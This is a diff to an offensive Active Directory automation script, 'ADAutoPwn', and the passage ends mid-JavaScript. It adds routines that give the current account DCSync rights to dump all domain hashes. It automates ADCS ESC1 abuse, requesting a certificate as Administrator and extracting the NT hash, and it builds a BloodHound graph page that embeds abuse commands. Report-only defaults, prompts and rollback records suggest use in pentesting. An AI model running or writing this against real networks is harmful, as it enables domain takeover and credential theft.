@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.0.0"
+readonly VERSION="1.1.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -142,6 +142,9 @@ STEALTH=0           # 1 = skip noisy techniques + add jitter (OPSEC)
 DO_ABUSE=0          # 1 = actually perform ACL/privilege abuse (otherwise report only)
 DO_CLEANUP=0        # 1 = revert every change this tool made, then exit
 ROLLBACK_FILE=""    # records undo actions for responsible cleanup
+GRAPH_ZIP=""        # --graph: render a BloodHound zip to graph.html and exit
+OWNED_FILE=""       # --owned: file of compromised principals to flag in the graph
+NO_OPEN=0           # 1 = never auto-open the graph in a browser
 PIVOT_PW='ADAutoPwn!2024#Reset'   # password set when abusing ForceChangePassword
 
 declare -a FOUND_USERS=()
@@ -165,6 +168,26 @@ _sudo() {
     if sudo -n true 2>/dev/null; then sudo "$@"
     elif [[ -n "$SUDO_PASS" ]]; then sudo -S -p '' "$@" <<<"$SUDO_PASS"
     else sudo "$@"; fi
+}
+
+# Sanitize an identity for safe use inside a filename (no slashes, spaces,
+# trailing extensions). Keeps only [A-Za-z0-9._-], trims, caps length.
+_safe_name() {
+    local s="$1"
+    s="${s//[^A-Za-z0-9._-]/_}"      # collapse anything unsafe to '_'
+    s="${s#.}"; s="${s%.}"           # no leading/trailing dot
+    printf '%s' "${s:0:64}"
+}
+
+# Decide whether a token is a plausible AD account name (rejects file paths,
+# wordlist filenames, blanks, separators that leaked from a grep).
+_is_valid_identity() {
+    local u="$1"
+    [[ -z "$u" ]] && return 1
+    [[ "$u" == *[/\\\ ]* ]] && return 1                      # path/space
+    [[ "$u" =~ \.(txt|json|log|csv|zip|ccache|ntds)$ ]] && return 1   # filename
+    [[ "$u" == "users_all" || "$u" == "users" ]] && return 1
+    return 0
 }
 
 # DOMAIN/USER principal for impacket-style tools
@@ -214,7 +237,10 @@ rb_record() {  # rb_record "<human description>" "<shell command that undoes it>
 # ---------------------------------------------------------------------------
 queue_cred() {  # queue_cred <user> <password|""> <nthash|"">
     local u="$1" p="$2" h="$3"
-    [[ -z "$u" ]] && return
+    if ! _is_valid_identity "$u"; then
+        [[ -n "$u" ]] && err "Ignoring implausible identity '$u' (looks like a path/filename)"
+        return
+    fi
     local key="${u,,}"
     [[ -n "${SEEN_CREDS[$key]:-}" ]] && return   # already assessed this identity
     CRED_QUEUE+=("${u}|${p}|${h}")
@@ -572,7 +598,7 @@ phase_validate_creds() {
     # proof the credentials are valid. ---
     if [[ "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]]; then
         subsection "Requesting Kerberos TGT first (-dc-ip, DNS-independent)"
-        local tgt="$OUTDIR/${USER}.ccache"
+        local tgt="$OUTDIR/$(_safe_name "$USER").ccache"
         rm -f "${USER}.ccache"
         if [[ -n "$HASH" ]]; then
             run "impacket-getTGT $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
@@ -732,6 +758,7 @@ phase_adcs() {
         warn "Review certipy_find.txt — possible escalation to Domain Admin via certificates"
         echo "$cout" | grep -iE 'Template Name|ESC[0-9]+|Enrollment Rights|Vulnerab' | sed 's/^/      /'
         info "e.g. ESC1:  certipy req -u $USER@$DOMAIN -ca <CA> -template <TPL> -upn administrator@$DOMAIN -dc-ip $DC_IP"
+        _abuse_adcs "$cout"
     else
         info "No automatically exploitable templates detected"
     fi
@@ -852,8 +879,17 @@ phase_relay() {
 
     if [[ "$CAP_LDAP" == "1" ]]; then
         subsection "LDAP signing & channel binding (relay → LDAP: RBCD / shadow creds / ESC8)"
-        run "$NXC ldap $DCT ${args[*]} -M ldap-checker"
-        $NXC ldap "$DCT" "${args[@]}" -M ldap-checker 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/relay_ldap.txt"
+        # ldap-checker resolves the target's FQDN itself. If it isn't resolvable
+        # (no /etc/hosts entry / no DNS) it throws a stacktrace — fall back to the
+        # DC IP as target so the module actually runs.
+        local ltgt="$DCT"
+        if [[ "$DCT" == "$DC_FQDN" ]] && ! getent hosts "$DC_FQDN" >/dev/null 2>&1; then
+            ltgt="$DC_IP"; info "FQDN $DC_FQDN not resolvable → using $DC_IP for ldap-checker"
+        fi
+        run "$NXC ldap $ltgt ${args[*]} -M ldap-checker"
+        $NXC ldap "$ltgt" "${args[@]}" -M ldap-checker 2>&1 \
+            | grep -avE 'Traceback|File \"|    [│┃|]|self\.|raise |[A-Za-z]+Error:|connection\.py' \
+            | tee -a "$LOGFILE" | tee "$OUTDIR/relay_ldap.txt"
         # Only read the LDAP-CHECKER verdict lines (avoid matching 'SMBv1:False' etc.)
         local lc; lc=$(grep -i 'LDAP-CHE' "$OUTDIR/relay_ldap.txt")
         if echo "$lc" | grep -qiE 'Connection fail|Name or service|Errno|timed out|error'; then
@@ -1062,13 +1098,14 @@ phase_acl() {
     subsection "Objects the current account can write (bloodyAD get writable)"
     run "bloodyAD ${ba[*]} get writable --detail"
     local w; w=$(bloodyAD "${ba[@]}" get writable --detail 2>&1); echo "$w" | tee -a "$LOGFILE"
-    echo "$w" >"$OUTDIR/acl_writable_${USER}.txt"
+    local sname; sname="$(_safe_name "$USER")"
+    echo "$w" >"$OUTDIR/acl_writable_${sname}.txt"
 
     if ! echo "$w" | grep -qiE 'distinguishedName|WRITE|GenericAll|Owner'; then
         info "No exploitable outbound ACLs for $USER"
         return
     fi
-    loot "$USER holds writable rights over one or more objects — see acl_writable_${USER}.txt"
+    loot "$USER holds writable rights over one or more objects — see acl_writable_${sname}.txt"
 
     # Parse candidate target objects (CN of each writable DN) and their rights
     # bloodyAD groups output per-object: a 'distinguishedName: CN=...' line followed by the granted permissions.
@@ -1078,6 +1115,10 @@ phase_acl() {
             cur_dn="${BASH_REMATCH[1]}"
             cur_name=$(echo "$cur_dn" | grep -oP '^CN=\K[^,]+')
             cur_class=""
+            # Domain head (DC=…,DC=… with no CN) → writeDacl here means DCSync
+            if [[ -z "$cur_name" && "$cur_dn" =~ ^[Dd][Cc]= ]]; then
+                cur_name="${DOMAIN:-domain}"; cur_class="domain"
+            fi
         fi
         [[ "$line" =~ objectClass.*group ]]    && cur_class="group"
         [[ "$line" =~ objectClass.*user  ]]    && cur_class="user"
@@ -1105,7 +1146,8 @@ phase_acl() {
             group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$cur_name" ;;
             full)
                 warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
-                if [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$cur_name"
+                if [[ "$cur_class" == "domain" ]]; then _abuse_dcsync_dacl
+                elif [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$cur_name"
                 elif [[ "$cur_class" == "computer" || "$cur_name" == *\$ ]]; then _abuse_rbcd "$cur_name" || _abuse_shadowcred "$cur_name"
                 else _abuse_shadowcred "$cur_name" || _abuse_user "$cur_name"; fi ;;
         esac
@@ -1222,7 +1264,7 @@ _abuse_writespn() {
     if bloodyAD "${ba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|modif'; then
         rb_record "Set temporary SPN $spn on $target" \
                   "bloodyAD ${ba[*]} remove object '$target' servicePrincipalName -v '$spn'"
-        local outf="$OUTDIR/kerberoast_writespn_${target}.txt"
+        local outf="$OUTDIR/kerberoast_writespn_$(_safe_name "$target").txt"
         run "impacket-GetUserSPNs $(imp_principal) -k -no-pass -request-user $target"
         KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass \
             -dc-host "${DC_FQDN:-$DC_IP}" -request-user "$target" -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
@@ -1236,6 +1278,55 @@ _abuse_writespn() {
     else
         warn "Could not set SPN on $target"
     fi
+}
+
+# WriteDACL / GenericAll over the DOMAIN head → grant ourselves DCSync, then dump.
+_abuse_dcsync_dacl() {
+    local ba; mapfile -t ba < <(bloody_args)
+    warn "Writable DACL on the domain head → can self-grant ${C_BOLD}DCSync${C_RESET}"
+    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to grant $USER DCSync and dump the domain)"; return; }
+    confirm "  Grant '${USER}' DCSync rights on '${DOMAIN}' and dump all hashes?" || return
+    run "bloodyAD ${ba[*]} add dcsync '$USER'"
+    if bloodyAD "${ba[@]}" add dcsync "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|grant|written|dcsync'; then
+        loot "★ Granted DCSync to ${USER} — replicating the domain"
+        rb_record "Granted DCSync to $USER on $DOMAIN" "bloodyAD ${ba[*]} remove dcsync '$USER'"
+        phase_dcsync
+    else
+        warn "Could not self-grant DCSync (WriteDACL may not cover the domain object)"
+    fi
+}
+
+# ADCS ESC1: request a cert impersonating Administrator, then auth → NT hash/TGT.
+# Best-effort parse of certipy output for CA + a template flagged ESC1.
+_abuse_adcs() {
+    local cout="$1"
+    have certipy || return 1
+    echo "$cout" | grep -qi 'ESC1' || return 1
+    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to auto-request an ESC1 cert as Administrator)"; return 1; }
+    local ca tpl
+    ca=$(echo "$cout"  | grep -ioP 'CA Name\s*:\s*\K\S+' | head -1)
+    tpl=$(echo "$cout" | awk 'BEGIN{IGNORECASE=1}/Template Name/{t=$0}/ESC1/{print t}' \
+            | grep -ioP 'Template Name\s*:\s*\K\S+' | head -1)
+    [[ -z "$ca" || -z "$tpl" ]] && { warn "Could not parse CA/template for auto-ESC1 — exploit manually (see certipy_find.txt)"; return 1; }
+    confirm "  ESC1: request a cert as Administrator via template '$tpl' on CA '$ca'?" || return 1
+    local rargs=(req -u "${USER}@${DOMAIN}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP")
+    [[ -n "$HASH" ]] && rargs+=(-hashes ":$HASH"); [[ -n "$PASS" ]] && rargs+=(-p "$PASS"); [[ "$KERBEROS" == "1" ]] && rargs+=(-k)
+    run "certipy ${rargs[*]}"
+    ( cd "$OUTDIR" && certipy "${rargs[@]}" 2>&1 ) | tee -a "$LOGFILE"
+    rb_record "ESC1: issued certificate impersonating Administrator" "echo 'Manual: revoke the issued certificate at the CA'"
+    local pfx; pfx=$(ls -t "$OUTDIR"/administrator*.pfx "$OUTDIR"/*.pfx 2>/dev/null | head -1)
+    [[ -z "$pfx" ]] && { warn "No PFX produced — template may need different flags"; return 1; }
+    run "certipy auth -pfx $(basename "$pfx") -dc-ip $DC_IP"
+    local aout; aout=$( cd "$OUTDIR" && certipy auth -pfx "$(basename "$pfx")" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
+    local nt; nt=$(echo "$aout" | grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' | awk -F: '{print $NF}' | head -1)
+    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
+        loot "★★★ ESC1 → Administrator NT hash: ${C_MAGENTA}$nt${C_RESET}"
+        note_cred_source "administrator" "ADCS ESC1 (certipy)"
+        queue_cred "administrator" "" "$nt"; return 0
+    fi
+    local cc; cc=$(ls -t "$OUTDIR"/administrator*.ccache 2>/dev/null | head -1)
+    [[ -n "$cc" ]] && loot "ESC1 → Administrator TGT cached → $(basename "$cc") (set KRB5CCNAME)"
+    return 0
 }
 
 # ===========================================================================
@@ -1643,6 +1734,802 @@ crack_hashes() {
 }
 
 # ===========================================================================
+#  BLOODHOUND → INTERACTIVE GRAPH  (self-contained, offline graph.html)
+#  Parses the collected BloodHound zip, builds nodes/edges, highlights attack
+#  paths to Domain Admins / DC, and embeds ready-to-run Linux+Windows abuse
+#  commands for every exploitable ACL edge — like BloodHound, but prettier.
+# ===========================================================================
+# Core renderer: reads env BH_ZIP / BH_HTML / OWNED_FILE / GDOMAIN / GDC and
+# writes a self-contained graph.html. Shared by the full run and --graph mode.
+render_graph_py() {
+    python3 - <<'PYEOF'
+import os, sys, json, zipfile
+from collections import defaultdict, deque
+
+ZIP   = os.environ.get("BH_ZIP","")
+HTML  = os.environ.get("BH_HTML","graph.html")
+OWNED = os.environ.get("OWNED_FILE","")
+DOM   = (os.environ.get("GDOMAIN","domain.local") or "domain.local")
+DC    = (os.environ.get("GDC","") or DOM)
+
+HTML_TEMPLATE = r'''<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ADAutoPwn · Attack Graph</title>
+<style>
+  :root{
+    --user:#4ea1ff; --group:#ffca3a; --computer:#ff6b6b; --domain:#36d399;
+    --gpo:#b794f6; --ou:#7dd3fc; --base:#94a3b8;
+    --path:#ff2d6d; --gold:#ffd24a; --owned:#ff3b3b;
+    --bg0:#0a0e16; --bg1:#11161f; --ink:#e6edf3; --muted:#9aa7b8;
+    --glass:rgba(20,26,38,.72); --line:rgba(255,255,255,.08);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;overflow:hidden;font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+    color:var(--ink);background:
+      radial-gradient(1200px 800px at 78% -10%,rgba(54,211,153,.10),transparent 60%),
+      radial-gradient(1000px 700px at -10% 110%,rgba(78,161,255,.12),transparent 55%),
+      linear-gradient(160deg,var(--bg0),var(--bg1));}
+  #c{position:fixed;inset:0;display:block;cursor:grab}
+  #c.grab{cursor:grabbing}
+  .glass{background:var(--glass);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+    border:1px solid var(--line);border-radius:16px;
+    box-shadow:0 10px 40px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.05)}
+  #header{position:fixed;top:18px;left:20px;padding:14px 18px;z-index:5}
+  #header h1{font-size:17px;font-weight:800;letter-spacing:.3px;
+    background:linear-gradient(90deg,#fff,#9fe7ff 40%,#7dffc4);-webkit-background-clip:text;background-clip:text;color:transparent}
+  #header .sub{font-size:11px;color:var(--muted);margin-top:3px;letter-spacing:.4px}
+  #header .sub b{color:#cfe8ff;font-weight:600}
+  #search{position:fixed;top:18px;right:20px;z-index:5;display:flex;gap:8px;align-items:center;padding:8px 10px}
+  #search input{background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:10px;color:var(--ink);
+    padding:8px 12px;font-size:13px;width:220px;outline:none;transition:.2s}
+  #search input:focus{border-color:rgba(125,255,196,.5);box-shadow:0 0 0 3px rgba(125,255,196,.12)}
+  #search .ico{font-size:13px;color:var(--muted)}
+  #search #reset{cursor:pointer;color:var(--muted);font-size:16px;padding:2px 7px;border-radius:8px;transition:.15s;user-select:none}
+  #search #reset:hover{background:rgba(255,255,255,.08);color:#7dffc4}
+  #legend{position:fixed;bottom:18px;left:20px;z-index:5;padding:12px 14px;font-size:12px}
+  #legend .row{display:flex;align-items:center;gap:8px;margin:5px 0;color:var(--muted)}
+  #legend .dot{width:11px;height:11px;border-radius:50%;box-shadow:0 0 10px currentColor}
+  #legend .ln{width:18px;height:0;border-top:3px solid var(--path);box-shadow:0 0 8px var(--path)}
+  #hint{position:fixed;bottom:18px;right:20px;z-index:5;font-size:11px;color:var(--muted);
+    padding:9px 12px;letter-spacing:.3px}
+  #tip{position:fixed;z-index:9;pointer-events:none;padding:6px 10px;border-radius:8px;font-size:12px;
+    background:rgba(8,11,18,.92);border:1px solid var(--line);color:#e8f0fb;display:none;max-width:280px}
+  #panel{position:fixed;top:0;right:0;height:100%;width:380px;z-index:8;transform:translateX(105%);
+    transition:transform .32s cubic-bezier(.22,1,.36,1);display:flex;flex-direction:column;
+    border-radius:18px 0 0 18px;overflow:hidden}
+  #panel.open{transform:translateX(0)}
+  #panel .head{padding:20px 20px 14px;border-bottom:1px solid var(--line);position:relative}
+  #panel .ptype{font-size:11px;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted)}
+  #panel .pname{font-size:18px;font-weight:800;margin-top:5px;word-break:break-all;line-height:1.3}
+  #panel .badges{margin-top:10px;display:flex;gap:7px;flex-wrap:wrap}
+  .badge{font-size:10px;font-weight:700;letter-spacing:.4px;padding:4px 9px;border-radius:999px;border:1px solid var(--line)}
+  .badge.hv{color:#1a1300;background:linear-gradient(90deg,#ffe08a,#ffc107);border:none}
+  .badge.owned{color:#fff;background:linear-gradient(90deg,#ff5b5b,#c81e1e);border:none}
+  .badge.t{color:var(--ink);background:rgba(255,255,255,.06)}
+  #panel .close{position:absolute;top:16px;right:16px;cursor:pointer;color:var(--muted);font-size:20px;
+    width:30px;height:30px;line-height:28px;text-align:center;border-radius:8px;transition:.15s}
+  #panel .close:hover{background:rgba(255,255,255,.08);color:#fff}
+  #panel .body{padding:16px 18px 30px;overflow-y:auto;flex:1}
+  #panel .body::-webkit-scrollbar{width:8px}#panel .body::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:8px}
+  .sect{font-size:11px;letter-spacing:1.2px;text-transform:uppercase;color:#7dffc4;margin:18px 0 9px;font-weight:700}
+  .stat{display:flex;justify-content:space-between;font-size:12.5px;color:var(--muted);padding:3px 0}
+  .stat b{color:var(--ink);font-weight:600}
+  .edge{font-size:12px;color:var(--muted);padding:4px 0;display:flex;gap:7px;align-items:center}
+  .edge .rt{color:#ffd24a;font-weight:600}
+  .abuse{border:1px solid var(--line);border-radius:12px;margin:11px 0;overflow:hidden;background:rgba(0,0,0,.22)}
+  .abuse .ah{padding:10px 12px;font-size:12.5px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;
+    background:linear-gradient(90deg,rgba(255,45,109,.16),transparent)}
+  .abuse .ah .arrow{color:var(--path);font-weight:800}
+  .abuse .ah .src{color:#cfe8ff;font-weight:700}.abuse .ah .dst{color:#ffd24a;font-weight:700}
+  .cmd{border-top:1px solid var(--line)}
+  .cmd .ch{display:flex;align-items:center;gap:8px;padding:8px 12px 4px;font-size:11px;color:var(--muted)}
+  .os{font-size:9.5px;font-weight:800;letter-spacing:.5px;padding:2px 7px;border-radius:6px}
+  .os.linux{background:rgba(78,161,255,.18);color:#9fcbff}
+  .os.win{background:rgba(125,255,196,.16);color:#9bf3cf}
+  .cmd pre{margin:0;padding:6px 12px 12px;font-family:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace;
+    font-size:11.5px;line-height:1.55;color:#e8f0fb;white-space:pre-wrap;word-break:break-all;cursor:pointer;position:relative}
+  .cmd pre:hover{color:#fff}
+  .cmd .cp{float:right;font-size:9.5px;color:var(--muted);border:1px solid var(--line);border-radius:6px;padding:1px 6px;margin-left:8px}
+  .empty{color:var(--muted);font-size:12.5px;font-style:italic;padding:8px 0}
+  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);z-index:20;
+    padding:9px 16px;border-radius:10px;font-size:12.5px;background:rgba(20,28,40,.95);border:1px solid var(--line);
+    color:#9bf3cf;opacity:0;transition:.25s;pointer-events:none}
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+<canvas id="c"></canvas>
+<div id="header" class="glass">
+  <h1>ADAutoPwn · Attack Graph</h1>
+  <div class="sub" id="meta"></div>
+  <div class="sub" id="count" style="color:#7dffc4"></div>
+</div>
+<div id="search" class="glass">
+  <span class="ico">&#128269;</span>
+  <input id="q" placeholder="Search any node… (Enter)" autocomplete="off" spellcheck="false">
+  <span id="reset" title="Reset to attack-path view">&#8635;</span>
+</div>
+<div id="legend" class="glass">
+  <div class="row"><span class="dot" style="color:var(--user)"></span>User</div>
+  <div class="row"><span class="dot" style="color:var(--group)"></span>Group</div>
+  <div class="row"><span class="dot" style="color:var(--computer)"></span>Computer</div>
+  <div class="row"><span class="dot" style="color:var(--domain)"></span>Domain</div>
+  <div class="row"><span class="ln"></span>Attack path → DA / DC</div>
+  <div class="row"><span style="color:var(--gold)">&#9733;</span>High value &nbsp; <span style="color:var(--owned)">&#9760;</span>Owned</div>
+</div>
+<div id="hint" class="glass">scroll = zoom · drag = move · click a node = abuse + expand · search = find anything</div>
+<div id="tip"></div>
+<div id="panel" class="glass">
+  <div class="head">
+    <div class="close" id="pclose">&times;</div>
+    <div class="ptype" id="ptype"></div>
+    <div class="pname" id="pname"></div>
+    <div class="badges" id="pbadges"></div>
+  </div>
+  <div class="body" id="pbody"></div>
+</div>
+<div class="toast" id="toast">copied</div>
+<script>
+const DATA   = __DATA__;
+const ABUSE  = __ABUSE__;
+const DOMAIN = __DOMAIN__;
+const DCHOST = __DC__;
+const META   = __META__;
+
+const COLORS={User:"#4ea1ff",Group:"#ffca3a",Computer:"#ff6b6b",Domain:"#36d399",
+  GPO:"#b794f6",OU:"#7dd3fc",Container:"#7dd3fc",Base:"#94a3b8"};
+const N=DATA.nodes, E=DATA.edges;
+document.getElementById("meta").innerHTML = META.replace(/·/g,"&middot;");
+
+// adjacency over ALL nodes (data stays complete so search can reach anything)
+const nb=N.map(()=>new Set());
+const incE=N.map(()=>[]);                 // incident edge indices per node
+E.forEach((e,i)=>{nb[e.s].add(e.t);nb[e.t].add(e.s);incE[e.s].push(i);incE[e.t].push(i);});
+const deg=N.map((_,i)=>incE[i].length);
+N.forEach((n,i)=>{n._i=i; n.r=(n.type==="Domain"?14:n.hv?10:7)+Math.min(deg[i]*0.22,5);
+  const a=Math.random()*6.28, rad=120+Math.random()*240;
+  n.x=Math.cos(a)*rad; n.y=Math.sin(a)*rad; n.vx=0; n.vy=0;});
+
+// ---- VISIBLE SET: start focused (owned + high-value + attack paths) --------
+// Showing every node is noise; we render only what matters and let the user
+// expand (click) or search to pull in the rest on demand.
+const vis=new Set();
+N.forEach((n,i)=>{ if(n.owned||n.hv||n.p) vis.add(i); });
+if(vis.size<2){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,25).forEach(i=>vis.add(i)); }
+let visArr=[...vis], VE=[];
+function refresh(){ visArr=[...vis]; const s=new Set();
+  visArr.forEach(i=>incE[i].forEach(ei=>{const e=E[ei]; if(vis.has(e.s)&&vis.has(e.t))s.add(ei);}));
+  VE=[...s]; updateCount(); }
+function expand(i){ vis.add(i); nb[i].forEach(j=>vis.add(j)); refresh(); reheat(); }
+
+const cv=document.getElementById("c"), ctx=cv.getContext("2d");
+let W=0,Hh=0,DPR=Math.min(window.devicePixelRatio||1,2);
+function resize(){W=innerWidth;Hh=innerHeight;cv.width=W*DPR;cv.height=Hh*DPR;cv.style.width=W+"px";cv.style.height=Hh+"px";ctx.setTransform(DPR,0,0,DPR,0,0);requestDraw();}
+addEventListener("resize",resize);
+
+let scale=1, tx=0, ty=0, alpha=1;
+function toScreen(x,y){return [x*scale+tx, y*scale+ty];}
+function toWorld(px,py){return [(px-tx)/scale,(py-ty)/scale];}
+
+// ---- physics over the VISIBLE set only (bounded cost) ----------------------
+function step(){
+  if(alpha<0.02) return false;
+  const arr=visArr, m=arr.length;
+  for(let a=0;a<m;a++){const A=N[arr[a]]; if(A.fx!=null)continue;
+    for(let b=a+1;b<m;b++){const B=N[arr[b]];
+      let dx=A.x-B.x, dy=A.y-B.y, d2=dx*dx+dy*dy+0.01; if(d2>250000)continue;
+      const f=1900/d2, d=Math.sqrt(d2), ux=dx/d, uy=dy/d;
+      A.vx+=ux*f;A.vy+=uy*f; B.vx-=ux*f;B.vy-=uy*f;}}
+  VE.forEach(ei=>{const e=E[ei],A=N[e.s],B=N[e.t]; let dx=B.x-A.x,dy=B.y-A.y;
+    let d=Math.sqrt(dx*dx+dy*dy)||1; const f=(d-115)*0.02, ux=dx/d, uy=dy/d;
+    A.vx+=ux*f;A.vy+=uy*f; B.vx-=ux*f;B.vy-=uy*f;});
+  let mx=0;
+  arr.forEach(i=>{const n=N[i];
+    n.vx+=-n.x*0.003; n.vy+=-n.y*0.003;            // gravity → compact, no drift
+    if(n.fx!=null){n.x=n.fx;n.y=n.fy;n.vx=n.vy=0;return;}
+    n.vx*=0.82; n.vy*=0.82;
+    if(n.vx>50)n.vx=50; else if(n.vx<-50)n.vx=-50;  // clamp → never explodes
+    if(n.vy>50)n.vy=50; else if(n.vy<-50)n.vy=-50;
+    n.x+=n.vx*alpha; n.y+=n.vy*alpha; mx=Math.max(mx,Math.abs(n.vx)+Math.abs(n.vy));});
+  alpha*=0.985;
+  return alpha>=0.02 && mx>0.4;                      // tells the loop when to stop
+}
+
+// ---- render-on-demand loop: runs only while moving, then idles at 0% CPU ---
+let running=false;
+function tick(){ const moving=step(); draw(); if(moving) requestAnimationFrame(tick); else running=false; }
+function requestDraw(){ if(!running){ running=true; requestAnimationFrame(tick); } }
+function reheat(){ alpha=Math.max(alpha,0.7); requestDraw(); }
+
+let hover=-1, sel=-1;
+function draw(){
+  ctx.clearRect(0,0,W,Hh);
+  const active = sel>=0?sel:hover;
+  const lit = active>=0 ? nb[active] : null;
+
+  VE.forEach(ei=>{
+    const e=E[ei], a=N[e.s], b=N[e.t];
+    const [ax,ay]=toScreen(a.x,a.y),[bx,by]=toScreen(b.x,b.y);
+    const rel = active>=0 && (e.s===active||e.t===active);
+    let col, w, glow=0;
+    if(e.p){col="rgba(255,45,109,.92)";w=2.1;glow=10;}
+    else if(rel){col="rgba(159,203,255,.85)";w=1.7;glow=5;}
+    else if(active>=0){col="rgba(120,130,150,.06)";w=1;}
+    else {col="rgba(130,142,165,.22)";w=1;}
+    const mx=(ax+bx)/2, my=(ay+by)/2, dx=bx-ax, dy=by-ay;
+    const cx=mx-dy*0.12, cy=my+dx*0.12;
+    ctx.beginPath(); ctx.moveTo(ax,ay); ctx.quadraticCurveTo(cx,cy,bx,by);
+    ctx.strokeStyle=col; ctx.lineWidth=w;
+    ctx.shadowBlur=glow; ctx.shadowColor=e.p?"#ff2d6d":"#9fcbff";
+    ctx.stroke(); ctx.shadowBlur=0;
+    if(e.p||rel){const ang=Math.atan2(by-cy,bx-cx), r=N[e.t].r+3;
+      const ex=bx-Math.cos(ang)*r, ey=by-Math.sin(ang)*r, s=6;
+      ctx.beginPath(); ctx.moveTo(ex,ey);
+      ctx.lineTo(ex-Math.cos(ang-0.4)*s,ey-Math.sin(ang-0.4)*s);
+      ctx.lineTo(ex-Math.cos(ang+0.4)*s,ey-Math.sin(ang+0.4)*s);
+      ctx.closePath(); ctx.fillStyle=col; ctx.fill();}
+  });
+
+  visArr.forEach(i=>{
+    const n=N[i]; const [x,y]=toScreen(n.x,n.y), r=n.r;
+    const dim = active>=0 && i!==active && !(lit&&lit.has(i));
+    const col=COLORS[n.type]||COLORS.Base;
+    ctx.globalAlpha = dim?0.16:1;
+    ctx.beginPath(); ctx.arc(x,y,r,0,7);
+    ctx.shadowBlur = dim?0:(n.p?16:10); ctx.shadowColor=col;
+    ctx.fillStyle=col; ctx.fill(); ctx.shadowBlur=0;
+    ctx.beginPath(); ctx.arc(x-r*0.3,y-r*0.3,r*0.42,0,7);
+    ctx.fillStyle="rgba(255,255,255,.35)"; ctx.fill();
+    ctx.lineWidth=1.3; ctx.strokeStyle="rgba(0,0,0,.5)";
+    ctx.beginPath(); ctx.arc(x,y,r,0,7); ctx.stroke();
+    if(n.hv && !dim){ctx.beginPath(); ctx.arc(x,y,r+4,0,7);
+      ctx.strokeStyle="rgba(255,210,74,.9)"; ctx.lineWidth=2;
+      ctx.shadowBlur=8; ctx.shadowColor="#ffd24a"; ctx.stroke(); ctx.shadowBlur=0;}
+    if(n.owned && !dim){ctx.beginPath(); ctx.arc(x,y,r+(n.hv?8:3),0,7);
+      ctx.strokeStyle="#ff3b3b"; ctx.lineWidth=2; ctx.stroke();
+      ctx.font="11px sans-serif"; ctx.fillStyle="#ff5b5b"; ctx.textAlign="center";
+      ctx.fillText("☠", x, y-r-(n.hv?10:5));}
+    if((scale>0.85 || i===active || (lit&&lit.has(i)) || n.hv || n.owned) && !dim){
+      ctx.font="11px Inter,system-ui"; ctx.textAlign="center"; ctx.textBaseline="top";
+      const lbl=short(n.label); ctx.lineWidth=3; ctx.strokeStyle="rgba(5,8,14,.85)";
+      ctx.strokeText(lbl,x,y+r+3); ctx.fillStyle="#dbe6f3"; ctx.fillText(lbl,x,y+r+3);}
+    ctx.globalAlpha=1;
+  });
+}
+function short(s){s=s||""; return s.length>26?s.slice(0,24)+"…":s;}
+function updateCount(){const el=document.getElementById("count");
+  if(el) el.textContent=visArr.length+" / "+N.length+" shown";}
+
+// fit the visible cluster into view once it settles
+let fitted=false;
+function fit(){ if(!visArr.length)return;
+  let x0=1e9,y0=1e9,x1=-1e9,y1=-1e9;
+  visArr.forEach(i=>{const n=N[i]; x0=Math.min(x0,n.x);y0=Math.min(y0,n.y);x1=Math.max(x1,n.x);y1=Math.max(y1,n.y);});
+  const w=x1-x0+160, h=y1-y0+160;
+  scale=Math.max(0.25,Math.min(1.6, Math.min(W/w,(Hh)/h)));
+  tx=W/2-((x0+x1)/2)*scale; ty=Hh/2-((y0+y1)/2)*scale;}
+
+// ---- picking (visible only) ----
+function pick(px,py){let best=-1,bd=1e9;
+  for(const i of visArr){const [x,y]=toScreen(N[i].x,N[i].y), r=N[i].r+5;
+    const d=(px-x)**2+(py-y)**2; if(d<r*r&&d<bd){bd=d;best=i;}} return best;}
+
+// ---- interaction ----
+let dragN=-1, panning=false, lastx=0,lasty=0, moved=false;
+cv.addEventListener("mousedown",ev=>{const i=pick(ev.clientX,ev.clientY); moved=false;
+  if(i>=0){dragN=i;N[i].fx=N[i].x;N[i].fy=N[i].y;reheat();}
+  else{panning=true;cv.classList.add("grab");} lastx=ev.clientX;lasty=ev.clientY;});
+addEventListener("mousemove",ev=>{
